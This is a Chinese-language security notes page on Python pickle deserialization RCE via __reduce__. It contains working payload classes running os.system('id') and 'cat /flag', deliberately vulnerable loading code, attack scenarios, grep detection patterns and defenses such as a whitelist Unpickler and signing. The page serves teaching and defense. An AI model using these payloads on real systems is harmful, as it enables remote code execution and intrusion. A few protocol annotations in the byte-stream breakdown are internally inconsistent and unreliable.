---
title: Python Pickle 反序列化漏洞原理与 __reduce__ 魔术方法利用实战
description: 系统梳理 Python pickle 序列化/反序列化机制，深度解析 __reduce__ 魔术方法导致的远程代码执行漏洞原理、利用链构造及实战绕过技巧，结合
  Python 2/3 差异、eval 注入风险、命令回显问题等核心知识点，形成完整的 Python 反序列化攻防知识体系。
category: program-analysis
tags:
- Python
- Pickle
- 反序列化
- RCE
- __reduce__
- 魔术方法
- 代码审计
- CTF
- Web安全
date: 2024-12-19
updated: '2026-11-15'
---

## 概述

Python `pickle` 模块是 Python 标准库中用于对象序列化与反序列化的核心组件。其设计初衷是将内存中的 Python 对象转换为字节流以便存储或传输，再还原为对象。然而，**pickle 反序列化过程支持任意可调用对象的执行**，若应用未对用户可控的 pickle 数据进行校验直接调用 `pickle.loads()`，即可导致远程代码执行（RCE）。本页系统梳理 pickle 核心接口、Python 2/3 差异、`__reduce__` 魔术方法利用原理、实战 Payload 构造及防御策略。

## 核心接口速查

| 接口 | 功能 | 典型场景 | 安全风险 |
|------|------|----------|----------|
| `pickle.dump(obj, file, protocol=None)` | 对象序列化写入文件 | 本地持久化存储 | 文件被篡改后反序列化触发 RCE |
| `pickle.load(file)` | 从文件反序列化 | 读取本地缓存/配置 | 同上 |
| `pickle.dumps(obj, protocol=None)` | 对象序列化为 `bytes` | 网络传输、Redis 存储 | 网络流量劫持、Redis 注入 |
| `pickle.loads(bytes_obj)` | 从字节流反序列化 | **最高风险：直接处理用户输入** | **用户可控数据导致 RCE** |

> **协议版本**：`protocol` 取值 0~4，Python 3 默认 protocol 3（二进制），Python 2 常用 protocol 0/1/2（文本/二进制混合）。协议版本不影响漏洞利用本质，仅影响字节流格式。

## Python 2 与 Python 3 差异对照

| 特性 | Python 2 | Python 3 |
|------|----------|----------|
| `pickle.dumps()` 返回类型 | `str` | `bytes` |
| 文件打开模式 | `'w'` / `'r'` | `'wb'` / `'rb'` |
| 字符串与字节互转 | 无需转换 | 需 `encode()`/`decode()` 或 `eval()` |
| `input()` 行为 | 等同 `eval(raw_input())` | 返回 `str`，需手动 `eval()` 转 `bytes` |
| 典型利用入口 | `raw_input()` 直接接收序列化字符串 | `eval(input())` 或 `bytes.fromhex()` 等转换后接收 |

**实战启示**：Python 2 环境下利用更直接（无需类型转换）；Python 3 环境常见 `eval(input())` 模式，若过滤不当仍可构造恶意 `bytes` 对象。

## __reduce__ 魔术方法漏洞原理

### 触发机制

`__reduce__` 是 Python 对象序列化协议的核心魔术方法之一。当对象被 `pickle.dumps()` 序列化时，pickle 会尝试调用 `__reduce__()` 获取还原指令；**反序列化时（`pickle.loads()`），会自动执行该指令**。

`__reduce__()` 返回值规范：
```python
def __reduce__(self):
    # 返回元组：(callable, args_tuple, ...)
    return (callable_object, (arg1, arg2, ...))
```

- **第一元素**：可调用对象（函数、类、实现 `__call__` 的实例）
- **第二元素**：传递给可调用对象的参数元组
- **额外元素**（可选）：状态字典、列表迭代器、字典迭代器等

### 漏洞利用链构造

最经典的利用链：`os.system` / `subprocess.Popen` / `commands.getstatusoutput` 等命令执行函数 + 用户可控参数。

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # 返回 (可调用对象, (参数,))
        # 这里 os.system('id') 会在反序列化时执行
        return (os.system, ('id',))

# 序列化生成 payload
payload = pickle.dumps(Exploit())
print(payload)
# b'\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'

# 反序列化触发 RCE
pickle.loads(payload)  # 执行 id 命令
```

**字节流结构解析**（protocol 3）：
```
\x80\x04          # PROTO 3
\x95\x1b...       # FRAME 长度
\x8c\x02nt        # SHORT_BINUNICODE 'nt' (模块名 os -> nt)
\x94              # MEMOIZE
\x8c\x06system    # SHORT_BINUNICODE 'system'
\x93              # STACK_GLOBAL (获取 nt.system)
\x94              # MEMOIZE
\x8c\x02id        # SHORT_BINUNICODE 'id'
\x94              # MEMOIZE
\x85              # TUPLE1 (将参数封装为元组)
\x94              # MEMOIZE
R                 # REDUCE (调用 callable(*args))
\x94              # MEMOIZE
.                 # STOP
```

### 进阶利用：解决命令回显问题

`os.system()` 仅返回退出码，**无回显**；`os.popen()` 返回文件对象需 `.read()`；Web 后端若无 `print` 直接 `return` 则看不到输出。

**替代方案**：

| 函数 | 特点 | 适用场景 |
|------|------|----------|
| `commands.getstatusoutput(cmd)` | 返回 `(status, output)` 元组，Python 2 专有 | Python 2 环境完美回显 |
| `subprocess.check_output(cmd, shell=True)` | 返回 stdout 字节流，异常时抛出 | Python 3 推荐 |
| `subprocess.getoutput(cmd)` | 返回 stdout 字符串（Python 3.5+） | 简单回显 |
| `__import__('os').popen(cmd).read()` | 兼容性好，需链式调用 | 受限环境绕过 |

**实战 Payload 示例（Python 3 回显）**：
```python
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        # 利用 subprocess.check_output 获取回显
        cmd = 'cat /flag'
        return (subprocess.check_output, (cmd,), {'shell': True})

payload = pickle.dumps(Exploit())
# 发送 payload 到目标 pickle.loads() 即可获取 flag 内容
```

## 典型攻击场景与入口点

### Web 应用直接反序列化用户输入
```python
# 典型漏洞代码
import pickle

@app.route('/api/data')
def api_data():
    user_input = request.args.get('data')  # 用户可控
    # 危险：eval 转换 + 无过滤反序列化
    obj = pickle.loads(eval(user_input))  
    return str(obj)
```
**利用方式**：构造恶意 `bytes` 字面量，如 `b'\x80\x04...'`，经 `eval()` 还原为 `bytes` 对象传入 `pickle.loads()`。

### Redis / Memcached 缓存投毒
- 应用将 pickle 序列化对象存入 Redis
- 攻击者具备 Redis 写权限（未授权访问、弱口令、SSRF 攻击 Redis）
- 篡改缓存键值为恶意 pickle 数据
- 后端读取缓存并 `pickle.loads()` 触发 RCE

### 序列化对象文件上传
- 功能点：上传 `.pkl` / `.pickle` 配置文件、模型文件、会话文件
- 后端直接 `pickle.load(open(filepath, 'rb'))`
- 上传恶意 pickle 文件即可 RCE

### Python 2 `raw_input()` 直接接收
```python
# Python 2 代码
import pickle
data = raw_input('data: ')  # 直接接收字符串
obj = pickle.loads(data)    # 无需类型转换，直接触发
```
**利用**：直接发送 `pickle.dumps(Exploit())` 生成的字符串（或 URL 编码后）。

## 防御与缓解策略

### 禁止反序列化不可信数据（根本对策）
- **永远不要**对用户可控数据调用 `pickle.loads()` / `pickle.load()`
- 替代方案：使用 **JSON**、**MessagePack**、**Protocol Buffers** 等安全序列化格式

### 如必须使用 pickle，实施严格校验
```python
import pickle
import io

class SafeUnpickler(pickle.Unpickler):
    # 白名单机制：仅允许反序列化指定模块/类
    ALLOWED = {
        'builtins': {'list', 'dict', 'str', 'int', 'float', 'tuple', 'set'},
        'collections': {'OrderedDict', 'defaultdict'},
        # 业务所需的安全类
    }
    
    def find_class(self, module, name):
        if module in self.ALLOWED and name in self.ALLOWED[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")

def safe_loads(data):
    return SafeUnpickler(io.BytesIO(data)).load()
```
> **注意**：白名单需极其严格，任何遗漏均可被绕过。生产环境强烈建议**彻底移除 pickle 反序列化**。

### 签名 / 完整性校验
- 对序列化数据计算 HMAC-SHA256 签名，反序列化前验签
- 密钥需妥善保管，防止密钥泄露导致伪造签名

### 沙箱与最小权限
- 反序列化操作放入独立容器/进程，限制 CPU/内存/网络/文件系统访问
- 进程以最低权限用户运行，禁用危险系统调用（seccomp）

### 静态分析与代码审计
- grep 危险模式：`pickle\.loads?\(`、`eval\(.*pickle`、`raw_input.*pickle`
- 关注 `__reduce__`、`__reduce_ex__`、`__getstate__`/`__setstate__` 等魔术方法定义

## 实战案例关联

| 场景 | 关联页面 | 说明 |
|------|----------|------|
| CTF Web 题目 pickle RCE | [[attack-defense-world-master-advanced-writeup]] | 攻防世界进阶区含 PHP 反序列化题目，思路互通 |
| PHP 反序列化魔术方法对比 | [[xd-security-deserialization-xxe-notes-day37-39]] | 对比 PHP `__wakeup`/`__destruct` 与 Python `__reduce__` |
| ThinkPHP5 反序列化链 | [[thinkphp5-deserialization-chain-analysis]] | 同为框架级反序列化漏洞，利用链构造思路可借鉴 |
| 白鹭杯 SoapClient 反序列化 | [[bailu-ctf-2023-writeup]] | PHP SSRF/RCE 链，展示反序列化联动其他漏洞 |
| XD安全课程反序列化笔记 | [[xd-security-ctf-flag-notes-day83-85]] | 含 Python 格式化字符串、PHP 弱类型绕过等关联题型 |

## 检测与利用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| `pickle` 模块本身 | 生成/测试 Payload | `python -c "import pickle; print(pickle.dumps(Exploit()))"` |
| `pwnlib.tubes.process` / `pwntools` | 远程交互自动化 | CTF 利用脚本编写 |
| `ysoserial.py` (社区维护) | 常见 Python 库 Gadget 集合 | 类似 Java `ysoserial`，收集 `__reduce__` 可利用类 |
| `bandit` / `semgrep` | 静态扫描 `pickle.loads` 调用 | CI/CD 集成 |
| `picklechecker` | 运行时 Hook `pickle.Unpickler.find_class` | 动态检测恶意反序列化 |

## 总结

| 核心点 | 关键结论 |
|--------|----------|
| **漏洞本质** | `pickle.loads()` 反序列化时会执行 `__reduce__` 返回的任意可调用对象 |
| **利用前提** | 应用对用户可控数据直接调用 `pickle.loads()` 且无白名单校验 |
| **核心 Gadget** | `os.system`、`subprocess.check_output`、`commands.getstatusoutput` 等命令执行函数 |
| **Python 2/3 差异** | 仅影响数据传输编码与类型转换，**不影响漏洞原理** |
| **命令回显** | `os.system` 无回显，实战需用 `subprocess.check_output` / `commands.getstatusoutput` |
| **根本防御** | **禁用 pickle 反序列化不可信数据**，改用 JSON 等安全格式 |
| **次级防御** | 白名单 `Unpickler`、签名校验、沙箱隔离、最小权限 |

> **一句话口诀**：Pickle 反序列化找 `__reduce__`，可控数据进 `loads` 必出 RCE；白名单校验改 JSON，签名沙箱权限最小。

## 交叉引用索引

- [[xd-security-deserialization-xxe-notes-day37-39]] — PHP/Java 反序列化魔术方法与利用链对比
- [[thinkphp5-deserialization-chain-analysis]] — 框架级反序列化漏洞分析方法论
- [[attack-defense-world-master-advanced-writeup]] — 实战 CTF 反序列化题目复现
- [[bailu-ctf-2023-writeup]] — SoapClient 反序列化联动 SSRF/RCE
- [[xd-security-ctf-flag-notes-day83-85]] — 序列化、SSTI、格式化字符串综合题型
- [[php伪协议与反序列化利用]] — PHP 伪协议配合反序列化的利用技巧
- [[ssrf-bypass-techniques]] — SSRF 与反序列化联动攻击面拓展

## 来源

- [0xfafu攻防实验室-202010-202112_14](../sources/0xfafu攻防实验室-202010-202112_14.md)
